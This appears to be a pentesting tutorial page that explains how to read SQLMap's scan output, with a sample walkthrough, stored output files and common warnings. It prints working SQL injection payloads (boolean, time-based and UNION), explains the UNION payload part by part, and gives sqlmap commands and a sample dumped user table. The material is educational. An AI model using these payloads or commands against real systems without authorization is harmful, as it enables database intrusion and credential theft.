---
title: 'SQLMap Output Description'
description: 'How to read, interpret, and act on SQLMap output. Understand every message type, log level, result format, and stored file so you know exactly what SQLMap is telling you.'
icon: material/text-box-search
tags:
  - sqlmap
  - sql-injection
  - output
---

# SQLMap Output Description

Understanding SQLMap's output is the difference between a script kiddie and a skilled operator. Let's break down **every type of message** you'll see.

---

## Message Types & Color Codes

SQLMap uses color-coded prefixes to categorize its output:

| Prefix | Color | Meaning |
|---|---|---|
| `[INFO]` | 🟢 Green | Informational messages — normal operation |
| `[WARNING]` | 🟡 Yellow | Potential issues that may affect results |
| `[ERROR]` | 🔴 Red | Something went wrong — may require intervention |
| `[CRITICAL]` | 🔴 Red | Fatal error — SQLMap cannot continue |
| `[DEBUG]` | ⚪ Gray | Internal debugging info (shown at `-v 2` and above) |
| `[PAYLOAD]` | 🔵 Blue | The actual SQL injection payload sent (shown at `-v 3`) |
| `[TRAFFIC IN]` | ⚪ Gray | Raw HTTP response received (shown at `-v 4`+) |
| `[TRAFFIC OUT]` | ⚪ Gray | Raw HTTP request sent (shown at `-v 4`+) |

---

## Reading the Scan Output Step-by-Step

Let's walk through a complete scan and understand every line:

### Phase 1: Connection & Stability

```text
[14:23:01] [INFO] testing connection to the target URL
```
SQLMap is making its first HTTP request to the target. If this fails, you'll see a `[CRITICAL]` error about connection issues.

```text
[14:23:01] [INFO] checking if the target is protected by some kind of WAF/IPS
```
SQLMap sends specific probes to detect if a Web Application Firewall is present. It checks for signatures from known WAFs like Cloudflare, ModSecurity, AWS WAF, etc.

```text
[14:23:02] [INFO] testing if the target URL content is stable
```

**This is important.** SQLMap makes two identical requests and compares the responses. If the page content changes between requests (e.g., ads, timestamps, random elements), SQLMap notes this:

```text
[14:23:02] [INFO] target URL content is stable
```
✅ **Good** — The page returns consistent content. SQLMap can reliably detect injection.

Or:

```text
[14:23:02] [WARNING] target URL content is NOT stable (i.e. content differs). 
This is not usually a problem, but it can affect results.
sqlmap will filter out the dynamic content for proper comparison.
```
⚠️ **Heads up** — SQLMap has detected dynamic content and will try to filter it out. Results may be less reliable.

### Phase 2: Dynamic Parameter Testing

```text
[14:23:02] [INFO] testing if GET parameter 'id' is dynamic
```
SQLMap changes the value of the `id` parameter and checks if the page content changes. If it does, the parameter actually affects the page output (which means it's likely used in a database query).

```text
[14:23:03] [INFO] GET parameter 'id' appears to be dynamic
```
✅ **Good** — The parameter changes the page, meaning it's processed server-side.

Or:

```text
[14:23:03] [WARNING] GET parameter 'id' does not appear to be dynamic
```
⚠️ **Not great** — The parameter doesn't seem to affect the output. Injection is still possible (e.g., `INSERT`/`UPDATE` queries) but less likely.

### Phase 3: Heuristic Testing

```text
[14:23:03] [INFO] heuristic (basic) test shows that GET parameter 'id' might 
be injectable (possible DBMS: 'MySQL')
```
SQLMap sent a single quote (`'`) and detected a MySQL error in the response. This is a **strong indicator** of SQL injection.

```text
[14:23:03] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be 
vulnerable to cross-site scripting (XSS) attacks
```
SQLMap also noticed the parameter might be vulnerable to XSS. This is a bonus finding — take note of it!

### Phase 4: Injection Testing

```text
[14:23:03] [INFO] testing for SQL injection on GET parameter 'id'
[14:23:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
```
SQLMap is now systematically testing injection techniques. Each line tells you exactly which technique and payload pattern it's trying.

```text
[14:23:04] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - 
WHERE or HAVING clause' injectable
```
🎯 **Injection found!** Boolean-based blind injection works on this parameter.

```text
[14:23:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:23:10] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND 
time-based blind (query SLEEP)' injectable
```
🎯 **Another technique confirmed!** Time-based blind also works.

```text
[14:23:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:23:11] [INFO] automatically extending ranges for UNION query injection 
technique tests as there is at least one other (potential) technique found
[14:23:13] [INFO] 'ORDER BY' technique appears to be usable. This should 
reduce the time needed to find the right number of query columns. 
Automatically extending the range for current UNION query injection technique 
test
[14:23:15] [INFO] target URL appears to have 3 columns in query
```

SQLMap has determined that the original SQL query returns 3 columns. This is critical for UNION-based injection.

```text
[14:23:16] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 
1 to 20 columns' injectable
```
🎯 **UNION-based injection confirmed!** This is the fastest technique — SQLMap will prioritize it.

### Phase 5: Summary

```text
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5738=5738

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4715 FROM (SELECT(SLEEP(5)))FjmI)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7836 UNION ALL SELECT NULL,CONCAT(0x717a787171,
    0x7a52564f48624e765773565361745a6d6f4c5563644474625578596b
    6247507958425141724c4c,0x71627a7071),NULL-- -
---
[14:23:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 8.1.2, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
```

This summary tells you **everything you need to know**:

- **Three injection techniques** work on the `id` parameter
- **Exact payloads** for each technique (study these!)
- **DBMS:** MySQL 5.0.12 or higher
- **Web server:** Apache 2.4.52 on Linux Ubuntu
- **Application:** PHP 8.1.2
- **Total requests:** 48 (very efficient)

---

## Understanding the Payload Breakdown

Let's dissect the UNION payload from above:

```sql
id=-7836 UNION ALL SELECT NULL,CONCAT(0x717a787171,
0x7a52564f48624e765773565361745a6d6f4c5563644474625578596b
6247507958425141724c4c,0x71627a7071),NULL-- -
```

| Part | Purpose |
|---|---|
| `id=-7836` | **Invalid ID** — ensures the original query returns no rows, so only our injected data appears |
| `UNION ALL SELECT` | Appends our crafted row to the result set |
| `NULL, ..., NULL` | Matches the 3 columns of the original query |
| `CONCAT(0x717a..., data, 0x71627a...)` | Wraps the extracted data between **random hex markers** so SQLMap can find it in the page |
| `-- -` | SQL comment to ignore the rest of the original query. The space after `--` is required in MySQL; the `-` after the space is just padding |

!!! info "Why the Hex Markers?"

    SQLMap wraps extracted data between unique hex strings (like `qzxqq...qbzpq`) so it can reliably find the injected data in the HTML response, even if the page contains other text. These markers are randomized for each session.

---

## Stored Output Files

After a successful scan, SQLMap creates several files in the output directory:

```
~/.sqlmap/output/target.com/
├── session.sqlite      # SQLite database with all results
├── log                 # Human-readable log of the scan
├── target.csv          # (if --dump) Data in CSV format
├── dump/               # (if --dump) Dumped data organized by DB/table
│   └── ecommerce/
│       ├── users.csv
│       └── products.csv
└── ...
```

### The `log` File

Contains a clean, timestamped record of everything SQLMap found:

```text title="~/.sqlmap/output/target.com/log"
Place: GET http://target.com/page.php?id=1
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5738=5738
...
```

### The `dump/` Directory

When you use `--dump`, SQLMap saves the extracted data as CSV files organized by database and table:

```text title="~/.sqlmap/output/target.com/dump/ecommerce/users.csv"
id,username,password,email
1,admin,$2y$10$abcdef...,admin@target.com
2,john,password123,john@target.com
3,jane,$2y$10$xyz123...,jane@target.com
```

!!! tip "Pro Tip: Custom Output Directory"

    For organized reporting, save output to a project-specific directory:

    ```bash
    sqlmap -r request.txt --output-dir="./engagement/target_sqli/"
    ```

---

## Interpreting Common Warning Messages

### "parameter appears to be not injectable"

```text
[WARNING] GET parameter 'id' does not seem to be injectable
```

**Meaning:** SQLMap tested the parameter with its current level/risk settings and couldn't confirm injection.

**What to do:**

1. Try increasing `--level` and `--risk`:
   ```bash
   sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
   ```
2. Manually verify the injection point exists
3. Try specifying the DBMS: `--dbms=mysql`
4. Try a different technique: `--technique=BT`

### "target URL content is NOT stable"

```text
[WARNING] target URL content is NOT stable
```

**Meaning:** The page content changes between identical requests.

**What to do:**

1. SQLMap will try to handle this automatically
2. You can help by specifying a known string that indicates a TRUE condition:
   ```bash
   sqlmap -u "http://target.com/page?id=1" --string="Welcome back"
   ```
3. Or specify a string that indicates a FALSE/error condition:
   ```bash
   sqlmap -u "http://target.com/page?id=1" --not-string="Invalid ID"
   ```

### "connection timed out to the target URL"

```text
[CRITICAL] connection timed out to the target URL
```

**Meaning:** SQLMap can't reach the server.

**What to do:**

1. Verify the URL is correct and the server is up
2. Check your VPN/proxy connection
3. Increase the timeout: `--timeout=30`
4. Add retries: `--retries=5`

### "possible integer casting detected"

```text
[WARNING] possible integer casting detected (e.g. "1 AND 1=1" would become 
"1") at the back end
```

**Meaning:** The application is casting the input to an integer before using it in the query, which strips any injected SQL.

**What to do:** This parameter is likely **not injectable** through standard techniques. Try looking at other parameters.
